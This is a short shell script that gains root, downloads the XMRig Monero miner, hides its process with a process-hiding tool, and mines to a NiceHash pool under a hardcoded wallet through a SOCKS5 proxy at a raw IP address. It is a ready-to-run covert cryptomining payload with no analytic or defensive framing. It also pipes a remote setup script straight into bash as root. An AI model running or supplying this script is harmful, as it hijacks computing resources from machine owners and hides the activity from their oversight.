#!/bin/sh
sudo su
sudo apt update
sudo apt upgrade -y

curl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash -
sudo apt-get install -y nodejs
npm i -g node-process-hider
npm install -g npm

wget https://github.com/xmrig/xmrig/releases/download/v6.17.0/xmrig-6.17.0-linux-x64.tar.gz
tar xf xmrig-6.17.0-linux-x64.tar.gz&
cd xmrig-6.17.0
sudo ph add xmrig
./xmrig -o stratum+tcp://randomxmonero.usa-west.nicehash.com:3380 -a RandomX -u 3J7rYdE9j5tvhms2emkNCLpvJ2fmVcHxri.TEST --threads=7 -x socks5://192.252.211.197:14921
